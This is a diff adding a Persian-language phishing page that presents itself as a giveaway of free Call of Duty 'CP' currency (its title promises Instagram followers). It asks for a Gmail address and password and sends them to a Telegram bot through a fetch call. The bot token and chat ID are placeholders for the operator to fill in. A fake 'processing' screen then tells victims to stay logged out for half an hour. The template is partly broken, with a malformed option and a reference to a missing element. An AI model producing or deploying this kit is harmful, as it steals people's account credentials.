@@ -1,0 +1,173 @@
+<!DOCTYPE html><html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>دریافت فالوور رایگان اینستاگرام</title>
+  <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Vazirmatn', sans-serif;
+    }body {
+  background: linear-gradient(135deg, #000000, #1f1c2c, #928DAB);
+  background-size: 600% 600%;
+  animation: bgMove 15s ease infinite;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  padding: 20px;
+  direction: rtl;
+}
+
+@keyframes bgMove {
+  0% { background-position: 0% 50%; }
+  50% { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
+}
+
+.container {
+  width: 100%;
+  max-width: 400px;
+  background: rgba(255, 255, 255, 0.1);
+  border-radius: 20px;
+  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+  backdrop-filter: blur(12px);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  padding: 30px 20px;
+  color: #fff;
+  animation: fadeIn 1s ease-in-out;
+}
+
+h2 {
+  text-align: center;
+  margin-bottom: 20px;
+  font-weight: bold;
+}
+
+.logo {
+  display: flex;
+  justify-content: center;
+  margin-bottom: 15px;
+}
+
+.logo img {
+  width: 64px;
+  height: 64px;
+  border-radius: 16px;
+}
+
+input, select, button {
+  width: 100%;
+  margin: 10px 0;
+  padding: 12px;
+  border-radius: 12px;
+  border: none;
+  font-size: 16px;
+}
+
+input, select {
+  background: rgba(255, 255, 255, 0.2);
+  color: #fff;
+  caret-color: #fff;
+}
+
+input::placeholder {
+  color: #fff;
+  opacity: 0.7;
+}
+
+button {
+  background: #00c6ff;
+  color: #000;
+  font-weight: bold;
+  cursor: pointer;
+  transition: background 0.3s;
+}
+
+button:hover {
+  background: #0072ff;
+  color: #fff;
+}
+
+.help {
+  background: rgba(255, 255, 255, 0.15);
+  color: #fff;
+  padding: 10px;
+  border-radius: 10px;
+  margin-top: 10px;
+  display: none;
+  font-size: 14px;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: scale(0.95); }
+  to { opacity: 1; transform: scale(1); }
+}
+
+.hidden { display: none; }
+
+  </style>
+</head>
+<body>
+  <div class="container" id="step1">
+    <div class="logo">
+      <img src="https://cdn.imgurl.ir/uploads/e154884_how-to-get-cp-in-call-of-duty-1.png" alt="Instagram Logo">
+    </div>
+    <h2>دریافت سیپی رایگان</h2>
+    <input type="text" id="username" placeholder="جیمیل اکانت">
+    <input type="password" id="password" placeholder=" رمز عبور اکانت">
+    <button onclick="goToStep2()">ورود</button>
+    <button onclick="toggleHelp()">راهنما</button>
+    <div class="help" id="helpBox">
+      برای دریافت سیپی رایگان ابتدا وارد شوید و سپس تعداد سیپی مد نظر را انتخاب کنید. لطفاً با فیلترشکن وارد شوید.
+    </div>
+  </div>  <div class="container hidden" id="step2">
+    <h2>تعداد سیپی</h2>
+    <select id="cps">
+      <option value="۱۲۰">۱۲۰ سیپی</option>
+      <option value="-" </option>
+      <option value=""> </option>
+      <option value=""> </option>
+      <option value=""> </option>
+    </select>
+    <button onclick="goToStep3()">ارسال سیپی</button>
+  </div>  <div class="container hidden" id="step3">
+    <h2>در حال پردازش...</h2>
+    <p style="text-align:center;margin-top:15px;"> لطفا وارد اکانت تا نیم ساعت نشوید سیپی رایگان بزودی به حساب شما واریز می‌شوند!</p>
+  </div>  <script>
+    function toggleHelp() {
+      const box = document.getElementById('helpBox');
+      box.style.display = box.style.display === 'block' ? 'none' : 'block';
+    }
+
+    function goToStep2() {
+      const user = document.getElementById('username').value;
+      const pass = document.getElementById('password').value;
+      if(user && pass) {
+        const token = "اینجا توکن رو بزار ";
+        const chat_id = "اینجا آیدی عددی بزار";
+        const msg = `ورود جدید:\nنام کاربری: ${user}\nرمز: ${pass}`;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.remove('hidden');
+      } else {
+        alert("همه فیلدها را پر کنید");
+      }
+    }
+
+    function goToStep3() {
+      const count = document.getElementById('followers').value;
+      const token = "اینجا توکن بزار";
+      const chat_id = "اینجا آیدی عددی بزار";
+      const msg = `کاربر درخواست فالوور داد:\nتعداد: ${count}`;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+
+      document.getElementById('step2').classList.add('hidden');
+      document.getElementById('step3').classList.remove('hidden');
+    }
+  </script></body>
+</html>
